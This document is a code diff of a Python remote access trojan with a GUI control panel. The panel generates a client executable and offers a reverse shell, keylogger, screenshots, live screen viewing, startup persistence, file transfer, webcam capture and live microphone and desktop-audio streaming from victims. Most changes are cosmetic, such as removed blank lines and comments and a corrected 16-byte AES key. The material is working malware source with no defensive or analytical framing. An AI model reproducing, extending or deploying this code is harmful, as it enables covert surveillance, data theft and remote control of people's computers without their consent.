@@ -13,22 +13,19 @@ from Crypto.Util.Padding import pad, unpad
 import pyaudio  # for playing mic/desktop audio on the server side
 
 # AES KEY/IV must match what's in the client
-AES_KEY = b"THIS_IS_16BYTEKEY"
-AES_IV  = b"IV_IS_16_BYTE_IV"
+AES_KEY = b"THIS_IS_16BYTKEY"  # 16 bytes key
+AES_IV  = b"IV_IS_16_BYTE_IV"   # 16 bytes IV
 
 def encrypt_data(plaintext: bytes) -> bytes:
-    # AES (CBC) encrypt
     cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
     return cipher.encrypt(pad(plaintext, AES.block_size))
 
 def decrypt_data(ciphertext: bytes) -> bytes:
-    # AES (CBC) decrypt
     cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
     return unpad(cipher.decrypt(ciphertext), AES.block_size)
 
 def create_client_file(ip, port, directory):
-    # Writes out client.py with debug prints in connect(),
-    # and embeds the remote function dir_b() correctly.
+    # Generate client.py with the same AES key/IV
     client_code = f'''
 import socket
 import subprocess
@@ -73,7 +70,7 @@ import traceback
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
-AES_KEY = b"THIS_IS_16BYTEKEY"
+AES_KEY = b"THIS_IS_16BYTKEY"
 AES_IV  = b"IV_IS_16_BYTE_IV"
 
 def encrypt_data(b: bytes) -> bytes:
@@ -188,7 +185,7 @@ def upload_file(args):
     try:
         enc = base64.b64decode(enc_b64)
         dec = decrypt_data(enc)
-        with open(remotefile,"wb") as f:
+        with open(remotefile, "wb") as f:
             f.write(dec)
         return f"[CLIENT] Uploaded => {{remotefile}}"
     except Exception as e:
@@ -200,7 +197,7 @@ def download_file(args):
         return "[CLIENT] usage: download <remotefile>"
     remotefile = parts[1]
     try:
-        with open(remotefile,"rb") as f:
+        with open(remotefile, "rb") as f:
             raw = f.read()
         enc = encrypt_data(raw)
         b64 = base64.b64encode(enc).decode("utf-8")
@@ -209,7 +206,6 @@ def download_file(args):
         return f"[CLIENT] Download fail: {{e}}"
 
 def dir_b(path_val):
-    # Note the escaped braces so that {path_val} is not interpreted now.
     cmd = f'dir /b "{{path_val}}"'
     return shell_command(cmd)
 
@@ -333,7 +329,7 @@ def handle_command(line):
 
 def send_output(sk, text):
     b = text.encode("utf-8", errors="replace")
-    ln = str(len(b)) + "\n"
+    ln = str(len(b)) + "\\n"
     sk.sendall(ln.encode("utf-8"))
     sk.sendall(b)
 
@@ -343,7 +339,7 @@ def recv_cmd(sk):
         c = sk.recv(1)
         if not c:
             return ""
-        if c == b"\n":
+        if c == b"\\n":
             break
         ln += c
     try:
@@ -388,7 +384,6 @@ if __name__=="__main__":
     client_py_path = os.path.join(directory, "client.py")
     with open(client_py_path, "w", encoding="utf-8") as f:
         f.write(client_code)
-
     hidden = (
         "--hidden-import=keyboard --hidden-import=PIL.ImageGrab "
         "--hidden-import=Crypto.Cipher --hidden-import=cv2 --hidden-import=pyaudio"
@@ -408,18 +403,14 @@ class RATApp(ctk.CTk):
         self.title("Python RAT - Debug Connect, no --noconsole")
         self.geometry("1000x700")
         ctk.set_appearance_mode("System")
-
         self.tabview = ctk.CTkTabview(self)
         self.tabview.pack(fill="both", expand=True)
-
         self.client_gen_tab = self.tabview.add("Client Generator")
         self.server_tab = self.tabview.add("Server")
         self.control_panel_tab = self.tabview.add("Control Panel")
-
         self.setup_client_gen()
         self.setup_server()
         self.setup_control_panel()
-
         self.clients = {}
         self.server_socket = None
         self.screen_view_events = {}
@@ -428,19 +419,15 @@ class RATApp(ctk.CTk):
         f = ctk.CTkFrame(self.client_gen_tab)
         f.pack(expand=True, fill="both")
         ctk.CTkLabel(f, text="Generate a Client EXE with debug connect()", font=("Arial", 18)).pack(pady=20)
-
         ctk.CTkLabel(f, text="Server IP:").pack()
         self.ip_entry = ctk.CTkEntry(f, placeholder_text="127.0.0.1")
         self.ip_entry.pack(pady=5)
-
         ctk.CTkLabel(f, text="Port:").pack()
         self.port_entry = ctk.CTkEntry(f, placeholder_text="4444")
         self.port_entry.pack(pady=5)
-
         self.directory_path = None
         browse_btn = ctk.CTkButton(f, text="Choose Save Directory", command=self.browse_dir)
         browse_btn.pack(pady=5)
-
         gen_btn = ctk.CTkButton(f, text="Generate Client EXE", command=self.gen_client)
         gen_btn.pack(pady=5)
 
@@ -470,15 +457,12 @@ class RATApp(ctk.CTk):
         f = ctk.CTkFrame(self.server_tab)
         f.pack(expand=True, fill="both")
         ctk.CTkLabel(f, text="Server Setup", font=("Arial", 18)).pack(pady=20)
-
         ctk.CTkLabel(f, text="Listen IP").pack()
         self.server_ip_entry = ctk.CTkEntry(f, placeholder_text="0.0.0.0")
         self.server_ip_entry.pack(pady=5)
-
         ctk.CTkLabel(f, text="Listen Port").pack()
         self.server_port_entry = ctk.CTkEntry(f, placeholder_text="4444")
         self.server_port_entry.pack(pady=5)
-
         start_btn = ctk.CTkButton(f, text="Start Server", command=self.start_server)
         start_btn.pack(pady=10)
 
@@ -490,7 +474,6 @@ class RATApp(ctk.CTk):
         except ValueError:
             print("Invalid port, using 4444.")
             p_i = 4444
-
         def srv_thread():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -504,57 +487,41 @@ class RATApp(ctk.CTk):
                 print("Connection from", ip_port)
                 self.clients[ip_port] = c
                 self.update_client_list()
-
         t = Thread(target=srv_thread, daemon=True)
         t.start()
 
     def setup_control_panel(self):
         f = ctk.CTkFrame(self.control_panel_tab)
         f.pack(expand=True, fill="both")
-
         f.grid_columnconfigure(0, weight=1)
         f.grid_columnconfigure(1, weight=1)
         f.grid_columnconfigure(2, weight=1)
-
         ctk.CTkLabel(f, text="Control Panel", font=("Arial", 18)).grid(row=0, column=0, columnspan=3, pady=10)
         ctk.CTkLabel(f, text="Select a Client").grid(row=1, column=0, columnspan=3, pady=5)
         self.client_option = ctk.CTkOptionMenu(f, values=[])
         self.client_option.grid(row=2, column=0, columnspan=3, padx=5, pady=5, sticky="nsew")
-
         shell_btn = ctk.CTkButton(f, text="Reverse Shell", command=self.open_shell)
         shell_btn.grid(row=3, column=0, padx=5, pady=5, sticky="ew")
-
         keylog_btn = ctk.CTkButton(f, text="Keylogger", command=self.open_keylogger)
         keylog_btn.grid(row=3, column=1, padx=5, pady=5, sticky="ew")
-
         sc_btn = ctk.CTkButton(f, text="Screenshot", command=self.take_screenshot)
         sc_btn.grid(row=3, column=2, padx=5, pady=5, sticky="ew")
-
         live_screen_btn = ctk.CTkButton(f, text="Live Screen", command=self.live_screen)
         live_screen_btn.grid(row=4, column=0, padx=5, pady=5, sticky="ew")
-
         add_btn = ctk.CTkButton(f, text="Add to Startup", command=self.add_startup)
         add_btn.grid(row=4, column=1, padx=5, pady=5, sticky="ew")
-
         rm_btn = ctk.CTkButton(f, text="Remove Startup", command=self.remove_startup)
         rm_btn.grid(row=4, column=2, padx=5, pady=5, sticky="ew")
-
         up_btn = ctk.CTkButton(f, text="Upload File", command=self.upload_file)
         up_btn.grid(row=5, column=0, padx=5, pady=5, sticky="ew")
-
         dn_btn = ctk.CTkButton(f, text="Download File", command=self.download_file)
         dn_btn.grid(row=5, column=1, padx=5, pady=5, sticky="ew")
-
         fm_btn = ctk.CTkButton(f, text="File Manager", command=self.file_manager)
         fm_btn.grid(row=5, column=2, padx=5, pady=5, sticky="ew")
-
         wc_btn = ctk.CTkButton(f, text="Webcam Photo", command=self.webcam_photo)
         wc_btn.grid(row=6, column=0, padx=5, pady=5, sticky="ew")
-
-        # Replace the previous mic/desktop audio with live streaming buttons.
         mic_btn = ctk.CTkButton(f, text="Live Mic", command=self.live_mic_stream)
         mic_btn.grid(row=6, column=1, padx=5, pady=5, sticky="ew")
-
         da_btn = ctk.CTkButton(f, text="Live Desktop Audio", command=self.live_desktop_stream)
         da_btn.grid(row=6, column=2, padx=5, pady=5, sticky="ew")
 
@@ -572,20 +539,16 @@ class RATApp(ctk.CTk):
         w = ctk.CTkToplevel(self)
         w.title(f"Reverse Shell - {c}")
         w.geometry("600x400")
-
         txt = ctk.CTkTextbox(w, wrap="word")
         txt.pack(fill="both", expand=True, padx=5, pady=5)
-
         e = ctk.CTkEntry(w, placeholder_text="shell <cmd>")
         e.pack(pady=5)
-
         def do_cmd():
             com = e.get().strip()
             if not com:
                 return
             r = self.send_cmd(c, com)
             txt.insert("end", f"\n> {com}\n{r}\n")
-
         b = ctk.CTkButton(w, text="Send", command=do_cmd)
         b.pack(pady=5)
 
@@ -595,16 +558,12 @@ class RATApp(ctk.CTk):
             return
         start_resp = self.send_cmd(c, "start_keylog")
         print("Keylogger start:", start_resp)
-
         w = ctk.CTkToplevel(self)
         w.title(f"Keylogger - {c}")
         w.geometry("500x300")
-
         box = ctk.CTkTextbox(w, wrap="word")
         box.pack(fill="both", expand=True, padx=5, pady=5)
-
         stop_evt = Event()
-
         def poll():
             while not stop_evt.is_set():
                 time.sleep(1)
@@ -613,17 +572,14 @@ class RATApp(ctk.CTk):
                     continue
                 box.delete("0.0", "end")
                 box.insert("end", logs)
-
         thr = Thread(target=poll, daemon=True)
         thr.start()
-
         def on_cl():
             stop_evt.set()
             time.sleep(0.2)
             sp = self.send_cmd(c, "stop_keylog")
             print("Keylogger stop:", sp)
             w.destroy()
-
         w.protocol("WM_DELETE_WINDOW", on_cl)
 
     def take_screenshot(self):
@@ -657,13 +613,10 @@ class RATApp(ctk.CTk):
         w = ctk.CTkToplevel(self)
         w.title(f"Live Screen - {c}")
         w.geometry("400x300")
-
         lb = ctk.CTkLabel(w, text="")
         lb.pack()
-
         st = Event()
         self.screen_view_events[c] = st
-
         def poll():
             while not st.is_set():
                 time.sleep(1)
@@ -681,15 +634,12 @@ class RATApp(ctk.CTk):
                     lb.image = tim
                 else:
                     print(resp)
-
         thr = Thread(target=poll, daemon=True)
         thr.start()
-
         def on_cl():
             st.set()
             time.sleep(0.2)
             w.destroy()
-
         w.protocol("WM_DELETE_WINDOW", on_cl)
 
     def add_startup(self):
@@ -756,20 +706,15 @@ class RATApp(ctk.CTk):
         c = self.get_sel_client()
         if not c:
             return
-
         fm_win = ctk.CTkToplevel(self)
         fm_win.title(f"File Manager - {c}")
         fm_win.geometry("600x400")
-
         current_path = ["."]
-
         path_var = ctk.StringVar(value=current_path[0])
         path_label = ctk.CTkLabel(fm_win, textvariable=path_var)
         path_label.pack(pady=5)
-
         scroll_frame = ctk.CTkScrollableFrame(fm_win)
         scroll_frame.pack(fill="both", expand=True, padx=5, pady=5)
-
         def refresh_file_list():
             for widget in scroll_frame.winfo_children():
                 widget.destroy()
@@ -780,7 +725,6 @@ class RATApp(ctk.CTk):
                 btn = ctk.CTkButton(scroll_frame, text=item, fg_color="transparent",
                                      hover_color="#3E3E3E", command=lambda i=item: open_item(i))
                 btn.pack(fill="x", pady=2, padx=5)
-
         def open_item(item):
             test_path = os.path.join(current_path[0], item)
             test_cmd = f'shell "dir \\"{test_path}\\""'
@@ -808,10 +752,8 @@ class RATApp(ctk.CTk):
                 current_path[0] = new_path
                 path_var.set(new_path)
                 refresh_file_list()
-
         up_btn = ctk.CTkButton(fm_win, text="Up", command=lambda: go_up())
         up_btn.pack(pady=5)
-
         def go_up():
             new_path = os.path.dirname(current_path[0])
             if new_path == "":
@@ -819,7 +761,6 @@ class RATApp(ctk.CTk):
             current_path[0] = new_path
             path_var.set(new_path)
             refresh_file_list()
-
         refresh_file_list()
 
     def webcam_photo(self):
@@ -849,19 +790,15 @@ class RATApp(ctk.CTk):
         c = self.get_sel_client()
         if not c:
             return
-
         win = ctk.CTkToplevel(self)
         win.title(f"Live Mic Stream - {c}")
         win.geometry("400x200")
         status_label = ctk.CTkLabel(win, text="Click Start to stream mic audio")
         status_label.pack(pady=10)
-
         streaming = [False]
-
         import pyaudio
         p = pyaudio.PyAudio()
         stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
-
         def start_stream():
             if streaming[0]:
                 return
@@ -880,13 +817,11 @@ class RATApp(ctk.CTk):
                     else:
                         print("Mic stream error:", r)
             Thread(target=stream_thread, daemon=True).start()
-
         def stop_stream():
             streaming[0] = False
             stream.stop_stream()
             stream.close()
             p.terminate()
-
         start_btn = ctk.CTkButton(win, text="Start", command=start_stream)
         start_btn.pack(pady=5)
         stop_btn = ctk.CTkButton(win, text="Stop", command=stop_stream)
@@ -896,19 +831,15 @@ class RATApp(ctk.CTk):
         c = self.get_sel_client()
         if not c:
             return
-
         win = ctk.CTkToplevel(self)
         win.title(f"Live Desktop Audio Stream - {c}")
         win.geometry("400x200")
         status_label = ctk.CTkLabel(win, text="Click Start to stream desktop audio")
         status_label.pack(pady=10)
-
         streaming = [False]
-
         import pyaudio
         p = pyaudio.PyAudio()
         stream = p.open(format=pyaudio.paInt16, channels=2, rate=44100, output=True)
-
         def start_stream():
             if streaming[0]:
                 return
@@ -927,13 +858,11 @@ class RATApp(ctk.CTk):
                     else:
                         print("Desktop audio stream error:", r)
             Thread(target=stream_thread, daemon=True).start()
-
         def stop_stream():
             streaming[0] = False
             stream.stop_stream()
             stream.close()
             p.terminate()
-
         start_btn = ctk.CTkButton(win, text="Start", command=start_stream)
         start_btn.pack(pady=5)
         stop_btn = ctk.CTkButton(win, text="Stop", command=stop_stream)
@@ -980,7 +909,6 @@ class RATApp(ctk.CTk):
         cur = self.client_option.get()
         if arr and cur not in arr:
             self.client_option.set(arr[0])
-
 
 if __name__=="__main__":
     app = RATApp()
